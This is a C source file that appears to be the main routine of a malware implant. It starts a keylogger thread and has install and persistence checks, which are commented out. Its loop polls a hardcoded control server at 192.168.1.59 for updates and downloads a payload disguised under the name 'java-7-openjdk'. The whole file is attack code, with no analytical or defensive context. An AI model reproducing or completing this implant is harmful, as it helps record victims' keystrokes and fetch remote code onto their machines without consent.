#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "core.h"

#define IP_ADDR "192.168.1.59"
#define PORT 4444

#define MAX_LOOPS 12

void *keylogger()
{
	init_keylogger();

	return NULL;
}

int main()
{
	int i, status;
	/*
	printf("Check if already running...\n");
	if (already_running() == OK) {
		printf("Already running, stopping...\n");
		return OK;
	}

	// If its installed continue, if not install and stop
	printf("Trying to install...\n");
	if (install() != ALT) {
		printf("Already installed or error, stopping...\n");
		return OK;
	}

	pthread_t thread_id_keylogger;

	pthread_create(&thread_id_keylogger, NULL, keylogger, NULL);
	*/
	for (i = 0; i < MAX_LOOPS; i++) {
		printf("Checking for update...\n");

		if (check_update(IP_ADDR"/update_ready", &status) != ERROR && status == 1) {
			download_file(IP_ADDR"/java-7-openjdk", 1);

			printf("Status > %d\n", status);
		}

		sleep(5);
	}

#ifdef DEBUG
	printf("Restarting normally...\n");
#endif

	//pthread_join(thread_id_keylogger, NULL);

	return OK;
}
